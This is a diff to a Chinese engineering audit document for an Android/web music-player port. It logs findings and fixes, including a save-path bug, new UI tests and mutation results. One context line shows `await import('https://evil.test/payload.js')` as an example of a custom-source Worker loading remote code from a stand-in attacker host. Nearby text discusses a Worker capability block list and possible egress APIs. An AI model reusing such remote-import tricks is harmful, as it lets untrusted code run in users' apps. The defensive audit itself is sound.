@@ -41,7 +41,9 @@
     **W4**（medium，本地音乐把会话级 `blob:` URL 当身份持久化）、**W5**（**2026-10-16 复核：
     原判理由是错的** —— 真 Worker 里没有 `navigator.sendBeacon`，真正漏掉的是 `WebSocketStream`，
     已修；但同批实测发现一个**更真的口子**：Worker 里的动态 `import()` 能拉远程模块，
-    页面 CSP 关不掉它，**未修、需原生/架构拍板**，见 §6.4.6 / §6.4.6b）、**W6**（low）、
+    页面 CSP 关不掉它，**未修、需原生/架构拍板**，见 §6.4.6 / §6.4.6b）、
+    **W6**（low，**2026-10-16 已修**：Android 上"保存路径"那一行**不渲染**，
+    桌面端选目录失败时会**说出来**，两个方向都有渲染断言 + 变异，见 §6.4.7）、
     以及 **W10**（**本轮更正**：`formData` 不是"静默发空请求"，
     `host.js:117` 会明确抛"Unsupported capability"，属于**已登记的显式不支持**，降为 low）。
     **W8 本轮已复核并修复**（web 产物里确实有 `electron-log` 的 Node 构建 ⇒ 真机上日志静默消失；
@@ -642,7 +644,7 @@ JSON 解出来的整数在 org.json 里常常是 `Integer`/`Long`，但**可能�
 | W3 | medium（**本轮复核后：不是 Android 与桌面的分歧**） | `userApi/contract.js:18-22`（经 `host.js:115-119`） | **桌面是同一套逻辑**：`src/main/modules/userApi/renderer/preload.js:126-138` 同样不检查空 `actions`、同样把剩下的照发；而**消费方是共享代码** `src/renderer/core/useApp/useInitUserApi.ts:134`（`qualitys[source] = sourceQualitys` 对**每一个** entry 都设）⇒ 两边都会出现"`assertApiSupport` 为真、但 `apis[source]` 里没有 `getMusicUrl`" | `filterSources` 会留下 `actions` 被过滤**空**的平台，而"一个可用平台都没有"也被当**成功**发布（`{status:true,sources:{}}`）。**⚠️ 这是两侧共有的潜在缺陷，不是 Android 单侧的偏差** —— 我复核了桌面那一份与共享的消费方，结论一致 | **已复核（两侧都读了）**。因为修它要改**共享渲染层**（会同时改变桌面行为），所以**本轮不动**：它需要一个决定 —— 是"丢掉没有可用 action 的平台、并在一个都没剩时报初始化失败"，还是维持现状（`filterSources` 之上的行为是 LX 的既有契约）。**登记为独立事项，不要当成 Android 侧缺陷去单向改。** |
 | W4 | medium | `filePicker/web.js:27` + `selectedFiles.js:2` + `renderer/utils/music.ts:83,90-91` | — | 选择器返回的是**会话级 `blob:` URL**，全仓只有 `UserApiModal.vue:95` 会释放；本地音乐那条路把 blob URL **当成歌曲身份持久化** ⇒ 重载后是一堆**永远播不了的歌**，且 File 句柄泄漏整场 | 未复核 |
 | W5 | low（**2026-10-16 复核：原判的理由被实测推翻，真正的口子在别处**） | `userApi/worker-runtime.js` 的能力黑名单 | — | 原判说"Beacon 是 `[Exposed=(Window,Worker)]` ⇒ 可用 `navigator.sendBeacon` 外联"。**真 Worker 实测：`navigator.sendBeacon` 是 `undefined`**（`RTCPeerConnection`/`WebTransport`/`SharedWorker`/`caches` 也都不存在）⇒ 那个洞不成立。**同批实测里真正存在却漏掉的是 `WebSocketStream`（`function`）**，已补进黑名单。另修掉"构造式能力报 `unsupported is not a constructor`"的可诊断性缺陷 | **已复核（真机引擎实测）+ 本轮已修** —— 见 §6.4.6；**并且顺手实测出一个黑名单原理上管不了的真口子：Worker 里的动态 `import()`**（未修，需原生/架构拍板，见 §6.4.6b） |
-| W6 | low | `filePicker/web.js:7` + `views/Setting/components/SettingDownload.vue:31-38` | — | `openDirectory` 明确 reject，但那个调用点**没有 `.catch`** ⇒ Android 上点"选择保存目录"**静默无反应** | 未复核 |
+| W6 | low（**2026-10-16 已修**） | `filePicker/web.js:17`（原来记的位置也不对，是 `:17` 那句 `throw`）+ `views/Setting/components/SettingDownload.vue:30-39` | — | `openDirectory` 明确 reject，但那个调用点**没有 `.catch`** ⇒ Android 上点"选择保存目录"**静默无反应**。复核时还发现**第二半**：那一行显示的 `download.savePath` 在 Android 上**根本不是文件落盘的地方**（执行器 `platform/download/android.ts:44` 把 `savePath` 规范成空串，原生侧把空串映射到 `getExternalFilesDir(null)/downloads` 并**拒绝**私有目录之外的路径）⇒ 用户看到的是一个假路径 + 一个点不动的按钮 | **已复核（代码）+ 本轮已修**，两个方向都钉了渲染断言与变异 —— 见 §6.4.7 |
 | W7 | low（**但对用户是"选完没反应"，本轮已修**） | `filePicker/web.js` 的 `returned` | — | 取消判定原来靠 `focus` + **一个固定 300 ms 定时器**去读 `input.files`。真机上 `focus` **早于** WebView 把文件填进 `input.files` 是常态，而结算只看那一刻的 `files` ⇒ **真选择被判成取消、文件静默丢掉**。这条路径是**首版范围内**的（自定义源导入、主题图导入、备份导入都走它） | **已复核（代码）+ 本轮已修** —— 见 §6.4.5 |
 | W8 | **升为 medium 并已修**（原判 low，本轮复核后确认后果比"低"严重） | `build-config/renderer/webpack.config.web.js` + `src/common/utils/index.ts:1`（`import log from 'electron-log/node'`） | — | web 产物里**确实有** `electron-log` 的 Node 构建。**实测证据（替换前，`dist-web` 的 `renderer.*.js` 与主 Worker chunk 都有）**：`AppData/Roaming`、`Library/Logs`、`xdg-open` —— 三个字面量都来自 `electron-log/src/node/NodeExternalApi.js`。后果**不是崩溃而是日志静默消失**：File 传输写盘时 `fs` 是空模块、抛错被 electron-log 自己的 `processInternalErrorFn` 吞掉 ⇒ **真机上应用自己的日志一条都不留**，而真机验收正要靠 logcat 看它 | **已复核（产物层 grep）+ 本轮已修** —— 见 §6.4.4 |
 | W9 | low（文档 vs 代码） | `docs/android/user-api-host.md:23` vs `userApi/host.js:192` | — | 文档说 `user_api_status` 事件能观察到 `initing`，而 host **刻意不发布**这个状态（发了会让渲染层就绪闸门按终态失败结算）；另外"移除活动源"的失败事件不带 `apiInfo`，渲染层会静默忽略 | **已复核 + 本轮已修（文档改正）**：`docs/android/user-api-host.md` 的那一行已改成"不含 `initing`，要看中间态请用 `get_user_api_status`"，并写明"移除活动源不带 `apiInfo` 是有意的"。代码**一个字没改**（它本来就是对的） |
@@ -938,6 +940,53 @@ await import('https://evil.test/payload.js')   // 在自定义源的 Worker 里
 **登记为独立事项**：先拍板"asset loader 加响应头"还是"网络层拦截"，再按原生改动排期；
 拍板之前**不要在渲染层做看起来像修了的改动**。
 
+#### 6.4.7 2026-10-16 已修：W6（Android 上"保存路径"是假路径 + 点不动的按钮）
+
+**两半缺陷**（审查只报了后一半）：
+
+1. `views/Setting/components/SettingDownload.vue` 原来无条件渲染 `download.savePath`。在 Android 上
+   这个值**不是文件落盘的地方**：执行器 `platform/download/android.ts:44` 有意把 `savePath` 规范成
+   空串（注释写明"桌面目录偏好里可能是 Windows 路径，绝不能进 Android 执行器"），
+   原生侧 `RainMusicDownloadTaskChannels.java` 把空目录映射到
+   `getExternalFilesDir(null)/downloads`，并用 `safeFile()` **拒绝**私有目录之外的任何路径。
+   而渲染层读的是 `defaultSetting.ts:91` 的 `path.join(os.homedir(), 'Desktop')` ——
+   web 构建里 `os` 是 polyfill，于是真机上显示的是形如 `/home/user/Desktop` 的**假路径**。
+2. "更改保存路径"按钮走的 `showSelectDialog({properties:['openDirectory']})` 在 web/Android 上
+   **明确抛**（`filePicker/web.js:17`："Directory selection requires Android document-tree support"），
+   而那个调用点**没有 `.catch`** ⇒ 未处理 rejection，点击**静默无反应**。
+
+**改法（两个方向）**：
+
+- 那一整行收口成 `v-if="isDesktopShell"`（与交通灯同一个开关，见 `renderer/platform/index.ts`）：
+  移动端**不渲染**假路径与死按钮。⚠️ 上方的 `dt#download`（"启用下载"开关）**不受影响**、仍然可用
+  —— 断言里专门有一条钉它，免得"修一半"把整段下载设置删掉。
+- `handleChangeSavePath` 补 `.catch`，用仓库既有约定 `dialog({ message })`
+  （`@renderer/plugins/Dialog`，全仓 23 处在用）把失败**说出来**，并且**不写**任何路径。
+
+**没有新增 i18n key**：`src/lang/*.json` 属于用户另线未提交的 30 个文件，本轮一个字都没碰；
+文案复用既有的 `setting__download_select_save_path`。
+
+**证据**：新增 `tests/ui/setting-download-shell.electron.cjs`（真实 Chromium 渲染真实 SFC；它是
+Options API + pug 模板，所以走 `descriptor.script.content` + `compileTemplate({preprocessLang:'pug'})`），
+10 条断言，两半各钉一遍：
+
+- 桌面：那一行**必须还在**、按钮还在、配置的路径**确实显示出来**、失败时 `dialog` 被调用一次、
+  且失败**不写**设置（`updateSetting` 零次调用）；
+- 移动：那一行**不在**、没有按钮、DOM 里**不出现**那个桌面默认路径、而"启用下载"开关还在。
+
+**变异**（出仓副本，1073 个文件 = 全部 tracked + 本轮两个新文件 + `node_modules` junction）：
+
+| 变异 | 结果 |
+|---|---|
+| 去掉 `v-if="isDesktopShell"` | **fail 3** —— 正好是移动端那三条 |
+| `v-if` 写死 `false` | **fail 4** —— 正好是桌面端那四条（说明"整行删掉"这种偷懒过不了门） |
+| 让 `.catch` 不再报告 | **fail 1** —— 正好是"失败被说出来"那条 |
+| 未变异对照 | exit 0 |
+
+⚠️ 顺手修掉一个**测试自身**的毛病：第一版在按钮不存在时直接 `null.click()`，于是"桌面端整行被写没"
+这种变异只给出 `exit 1`、**给不出是哪条断言红的**（变异 M2 第一次跑就是 `failing: []`）。
+现在按钮缺失时跳过点击、由断言具名失败。CI 矩阵因此从 8 个套件变成 **9** 个。
+
 **对 6.4 这一轮审查确认"没问题"的部分**（省下一次重查）：
 
 - **沙箱边界**：`lx` 与 `rain` 是同一个冻结对象；白名单 `['tx','kg','wy','local']` 封闭；
@@ -1126,9 +1175,9 @@ node node_modules\typescript\bin\tsc -p src\common\tsconfig.json --noEmit
 node --test tests\unit\*.test.cjs                                      # 单测（当前基线 470）
 node build-config\pack.js                                              # 桌面构建
 npm.cmd run build:web                                                  # web 构建
-# UI 套件：CI 矩阵跑 8 个（settings-controls / settings-layout / player / compact-lyrics /
-# lyric-security / responsive-layout / window-controls / window-controls-shell）
-npm.cmd run test:ui                                                    # 本地一次跑完上面 8 个
+# UI 套件：CI 矩阵跑 9 个（settings-controls / settings-layout / player / compact-lyrics /
+# lyric-security / responsive-layout / window-controls / window-controls-shell / setting-download-shell）
+npm.cmd run test:ui                                                    # 本地一次跑完上面 9 个
 npm.cmd run test:surfaces                                              # 不在 CI 矩阵里，属可选
 npx.cmd cap sync android                                               # Capacitor 同步
 ```
